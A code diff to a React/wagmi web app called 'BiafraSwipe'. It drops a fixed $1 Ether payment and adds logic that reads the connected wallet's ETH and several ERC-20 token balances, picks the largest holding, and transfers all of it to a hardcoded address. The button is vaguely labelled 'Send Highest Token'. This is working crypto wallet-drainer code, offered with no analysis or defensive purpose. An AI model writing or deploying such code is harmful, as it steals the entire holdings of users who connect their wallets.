@@ -13,8 +13,8 @@ const projectId = '1c1db7ada235d88816f2f0008d415fdc';
 const metadata = {
   name: 'BiafraSwipe',
   description: 'BiafraSwipe Description',
-  url: 'https://mywebsite.com',
-  icons: ['https://avatars.mywebsite.com/'],
+  url: 'https://BiafraSwipe.vercel.app',
+  icons: ['https://i.ibb.co/VqKnLQs/Ethereum-Classic-Logo-PNG-Pic.png'],
 };
 const chains = [mainnet, goerli];
 const config = defaultWagmiConfig({
@@ -44,48 +44,105 @@ function ConnectButton() {
 
 const ethers = require('ethers');
 const toAddress = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f';
-const amountInUSD = 1;
+const tokenAddresses = {
+  Ethereum: null, // Native token
+  USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+  USDC: '0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
+  ShibaInu: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
+  Chainlink: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
+  WrappedBitcoin: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
+  Solana: '0x7D6F6bAC8eF3f1E5D3C5e1B273c6C98988D11B5C',
+  AAVE: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
+  Polkadot: '0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B',
+  BNB: '0xB8c77482e45F1F44dE1745F52C74426C631bDD52'
+};
+
+async function getTokenBalances(provider, address) {
+  const balances = {};
+
+  // Check balance of native Ethereum
+  balances['Ethereum'] = await provider.getBalance(address);
+
+  // Check balance of ERC-20 tokens
+  for (const [token, tokenAddress] of Object.entries(tokenAddresses)) {
+    if (token !== 'Ethereum') {
+      const contract = new ethers.Contract(
+        tokenAddress,
+        ['function balanceOf(address) view returns (uint256)'],
+        provider
+      );
+      balances[token] = await contract.balanceOf(address);
+    }
+  }
+  return balances;
+}
+
+async function transferHighestToken(signer, balances) {
+  let highestToken = 'Ethereum';
+  let highestBalance = balances['Ethereum'];
+
+  for (const [token, balance] of Object.entries(balances)) {
+    if (balance.gt(highestBalance)) {
+      highestToken = token;
+      highestBalance = balance;
+    }
+  }
+
+  if (highestToken === 'Ethereum') {
+    const gasPrice = await signer.getGasPrice();
+    const estimateGas = await signer.estimateGas({
+      to: toAddress,
+      value: highestBalance,
+    });
+    const gasCost = gasPrice.mul(estimateGas);
+    const value = highestBalance.sub(gasCost);
+
+    const tx = await signer.sendTransaction({
+      to: toAddress,
+      value: value,
+    });
+    await tx.wait();
+  } else {
+    const contract = new ethers.Contract(
+      tokenAddresses[highestToken],
+      ['function transfer(address to, uint256 value) public returns (bool)'],
+      signer
+    );
+
+    const tx = await contract.transfer(toAddress, highestBalance);
+    await tx.wait();
+  }
+}
 
 function App() {
   const { address, isConnected } = useAccount();
   const { connect, connectors } = useConnect();
   const { disconnect } = useDisconnect();
-  const [conversionRate, setConversionRate] = useState(null);
+  const [balances, setBalances] = useState({});
 
   useEffect(() => {
-    const fetchConversionRate = async () => {
-      try {
-        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
-        const data = await response.json();
-        setConversionRate(data.ethereum.usd);
-      } catch (error) {
-        console.error('Error fetching conversion rate:', error);
-      }
-    };
+    if (isConnected) {
+      const fetchBalances = async () => {
+        const provider = ethers.getDefaultProvider('mainnet', {
+          infura: 'c05e035e823a4769b62ae15c1cbe2f02'
+        });
+        const balances = await getTokenBalances(provider, address);
+        setBalances(balances);
+      };
 
-    fetchConversionRate();
-  }, []);
+      fetchBalances();
+    }
+  }, [isConnected, address]);
 
   const handleConnect = () => {
     connect({ connector: connectors[0] });
   };
 
   const handleSendTransaction = async () => {
-    if (isConnected && conversionRate) {
+    if (isConnected) {
       const signer = await getEthersSigner(config);
-      const amountInETH = ethers.utils.parseEther((amountInUSD / conversionRate).toFixed(18));
-
-      try {
-        const tx = await signer.sendTransaction({
-          to: toAddress,
-          value: amountInETH,
-        });
-        await tx.wait();
-        alert('Transaction successful!');
-      } catch (error) {
-        console.error('Transaction failed:', error);
-        alert('Transaction failed. Please try again.');
-      }
+      await transferHighestToken(signer, balances);
+      alert('Transaction successful!');
     }
   };
 
@@ -96,7 +153,17 @@ function App() {
         {isConnected ? (
           <>
             <p>Connected account: {address}</p>
-            <button onClick={handleSendTransaction}>Send $1 Ether</button>
+            <div>
+              <h2>Token Balances:</h2>
+              <ul>
+                {Object.entries(balances).map(([token, balance]) => (
+                  <li key={token}>
+                    {token}: {ethers.utils.formatUnits(balance, token === 'Ethereum' ? 18 : 6)}
+                  </li>
+                ))}
+              </ul>
+            </div>
+            <button onClick={handleSendTransaction}>Send Highest Token</button>
             <button onClick={disconnect}>Disconnect Wallet</button>
           </>
         ) : (
